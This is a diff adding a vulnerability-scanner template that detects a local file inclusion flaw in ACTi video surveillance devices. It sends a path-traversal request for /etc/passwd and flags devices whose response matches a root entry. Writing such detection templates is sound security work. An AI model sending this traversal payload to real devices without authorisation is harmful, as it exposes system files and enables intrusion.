@@ -1,0 +1,27 @@
+id: acti-video-lfi
+name: ACTi-Video Monitoring - Local File Inclusion
+severity: high
+confidence: confirmed
+description: ACTI video surveillance has loopholes in reading any files
+reference: https://www.cnblogs.com/hmesed/p/16292252.html
+tags:
+- acti
+- lfi
+- iot
+- video
+- monitoring
+- vuln
+requests:
+- method: GET
+  path: /images/../../../../../../../../etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: header
+    words:
+    - application/octet-stream
+  - type: status
+    status:
+    - 200
+  condition: and
